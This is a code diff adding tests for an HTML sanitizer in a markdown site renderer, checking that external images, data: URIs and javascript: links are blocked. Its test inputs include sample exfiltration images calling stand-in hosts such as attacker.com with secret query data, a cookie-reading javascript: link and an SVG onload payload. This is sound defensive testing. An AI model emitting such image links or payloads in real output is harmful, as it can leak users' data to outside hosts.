@@ -47,6 +47,7 @@ from dde.commands.site import (
     _add_heading_ids,
     _dedent_tables,
     _rewrite_md_links,
+    _sanitize_external_urls,
     _slugify_heading,
     _strip_leading_h1,
 )
@@ -81,6 +82,7 @@ def _render_pipeline(text: str) -> str:
     html = _md(text)
     html = _add_heading_ids(html)
     html = _rewrite_md_links(html)
+    html, _ = _sanitize_external_urls(html)
     return html
 
 
@@ -324,6 +326,159 @@ def test_full_pipeline_integration():
 
 
 # ---------------------------------------------------------------------------
+# Item 4 — External URL sanitization (#170)
+# ---------------------------------------------------------------------------
+
+
+def test_external_image_blocked():
+    """External image URL is replaced with a visible marker."""
+    md = "## Results\n\n![data exfil](https://attacker.com/log?data=SECRET)\n"
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"<img> tag survived: {html!r}"
+    assert 'blocked-image' in html, f"No blocked marker: {html!r}"
+    assert 'attacker.com' in html, f"URL not shown in marker: {html!r}"
+
+
+def test_zero_pixel_image_blocked():
+    """Zero-pixel invisible image (empty alt text) is blocked."""
+    md = "Some findings.\n\n![](https://evil.com/1x1.gif?secret=compound_X)\n\nMore text."
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"Invisible img survived: {html!r}"
+    assert 'blocked-image' in html
+
+
+def test_encoded_url_image_blocked():
+    """Image with URL-encoded characters is still blocked."""
+    md = "![alt](https://evil.com/%2e%2e/log?d=SECRET)\n"
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"Encoded URL img survived: {html!r}"
+    assert 'blocked-image' in html
+
+
+def test_data_uri_image_blocked():
+    """data: URI in image src is blocked.
+
+    Mistune v3+ replaces data: URIs with ``#harmful-link`` before our
+    sanitizer runs, so the img tag survives but its src is harmless.
+    Our sanitizer catches data: URIs that bypass mistune (e.g. raw HTML
+    passed directly).  The security property is: no ``data:`` src
+    survives the pipeline.
+    """
+    md = '![](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)\n'
+    html = _render_pipeline(md)
+    assert 'data:' not in html, f"data: URI survived: {html!r}"
+    # Also verify the direct sanitizer catches data: URIs at HTML level
+    from dde.commands.site import _sanitize_external_urls
+    raw_html = '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="">'
+    sanitized, warnings = _sanitize_external_urls(raw_html)
+    assert '<img' not in sanitized, f"data: img survived sanitizer: {sanitized!r}"
+    assert 'blocked-image' in sanitized
+
+
+def test_javascript_link_blocked():
+    """javascript: href is neutralized."""
+    md = "[click me](javascript:alert(document.cookie))\n"
+    html = _render_pipeline(md)
+    assert 'javascript:' not in html, f"javascript: survived: {html!r}"
+
+
+def test_external_link_preserved_with_safety():
+    """External http/https links are kept but get safety attributes."""
+    md = "[PubMed](https://pubmed.ncbi.nlm.nih.gov/12345678/)\n"
+    html = _render_pipeline(md)
+    assert 'href="https://pubmed.ncbi.nlm.nih.gov/12345678/"' in html, (
+        f"External link removed: {html!r}"
+    )
+    assert 'noopener' in html, f"Missing noopener: {html!r}"
+
+
+def test_internal_image_preserved():
+    """Relative image paths (internal) are NOT blocked."""
+    md = "![chart](images/figure1.png)\n"
+    html = _render_pipeline(md)
+    assert '<img' in html, f"Internal image was blocked: {html!r}"
+    assert 'src="images/figure1.png"' in html
+    assert 'blocked-image' not in html
+
+
+def test_http_image_blocked():
+    """Plain http:// images are blocked too, not just https://."""
+    md = "![](http://attacker.com/log?d=SECRET)\n"
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"HTTP img survived: {html!r}"
+    assert 'blocked-image' in html
+
+
+def test_protocol_relative_image_blocked():
+    """Protocol-relative //host/path images are blocked."""
+    md = "![](//attacker.com/log?d=SECRET)\n"
+    html = _render_pipeline(md)
+    assert '<img' not in html, f"Protocol-relative img survived: {html!r}"
+    assert 'blocked-image' in html
+
+
+def test_multiple_external_images_all_blocked():
+    """Multiple external images in one document are all blocked."""
+    md = (
+        "## Report\n\n"
+        "![](https://a.com/1.gif?d=1)\n"
+        "Text between.\n"
+        "![](https://b.com/2.gif?d=2)\n"
+        "![](https://c.com/3.gif?d=3)\n"
+    )
+    html = _render_pipeline(md)
+    assert '<img' not in html
+    assert html.count('blocked-image') == 3
+
+
+def test_sanitize_returns_warnings():
+    """_sanitize_external_urls returns a warning per blocked URL."""
+    from dde.commands.site import _sanitize_external_urls
+    html_in = '<img src="https://evil.com/x.gif" alt=""><img src="images/ok.png" alt="">'
+    html_out, warnings = _sanitize_external_urls(html_in)
+    assert len(warnings) == 1, f"Expected 1 warning, got {len(warnings)}: {warnings}"
+    assert 'evil.com' in warnings[0]
+    assert '<img' in html_out  # internal image preserved
+    assert 'src="images/ok.png"' in html_out
+
+
+def test_raw_html_still_blocked():
+    """Existing protection: raw HTML tags are still escaped by mistune."""
+    md = '<script>alert(1)</script>\n<img src="https://evil.com/x">\n'
+    html = _render_pipeline(md)
+    assert '<script>' not in html, f"Script tag survived: {html!r}"
+    assert '&lt;script&gt;' in html
+
+
+def test_full_security_integration():
+    """Integration: realistic document with mixed content."""
+    md = (
+        "# Safety Assessment\n\n"
+        "## Summary\n\n"
+        "The compound shows moderate hERG liability. "
+        "See [FDA guidance](https://www.fda.gov/drugs/guidance) for details.\n\n"
+        "## Data\n\n"
+        "| Assay | IC50 |\n"
+        "|---|---|\n"
+        "| hERG | 15 µM |\n\n"
+        "![](https://attacker.com/log?compound=XYZ-123&target=hERG&ic50=15)\n\n"
+        "## References\n\n"
+        "![chart](figures/herg-dose-response.png)\n"
+    )
+    html = _render_pipeline(md)
+    # Malicious image blocked
+    assert 'attacker.com' in html  # visible in marker
+    assert '<img src="https://attacker.com' not in html  # but not as a live tag
+    # Legitimate internal image preserved
+    assert 'src="figures/herg-dose-response.png"' in html
+    # Legitimate external link preserved
+    assert 'href="https://www.fda.gov/drugs/guidance"' in html
+    # Table intact
+    assert '<table' in html
+    assert 'hERG' in html
+
+
+# ---------------------------------------------------------------------------
 # Runner
 # ---------------------------------------------------------------------------
 
@@ -354,6 +509,21 @@ if __name__ == "__main__":
     _run("subdirectory_md_link_with_fragment", test_subdirectory_md_link_with_fragment)
     _run("non_md_links_untouched", test_non_md_links_untouched)
     _run("full_pipeline_integration", test_full_pipeline_integration)
+
+    # Item 4: External URL sanitization (#170)
+    _run("external_image_blocked", test_external_image_blocked)
+    _run("zero_pixel_image_blocked", test_zero_pixel_image_blocked)
+    _run("encoded_url_image_blocked", test_encoded_url_image_blocked)
+    _run("data_uri_image_blocked", test_data_uri_image_blocked)
+    _run("javascript_link_blocked", test_javascript_link_blocked)
+    _run("external_link_preserved_with_safety", test_external_link_preserved_with_safety)
+    _run("internal_image_preserved", test_internal_image_preserved)
+    _run("http_image_blocked", test_http_image_blocked)
+    _run("protocol_relative_image_blocked", test_protocol_relative_image_blocked)
+    _run("multiple_external_images_all_blocked", test_multiple_external_images_all_blocked)
+    _run("sanitize_returns_warnings", test_sanitize_returns_warnings)
+    _run("raw_html_still_blocked", test_raw_html_still_blocked)
+    _run("full_security_integration", test_full_security_integration)
 
     # Report
     passed = sum(1 for _, ok, _ in _RESULTS if ok)
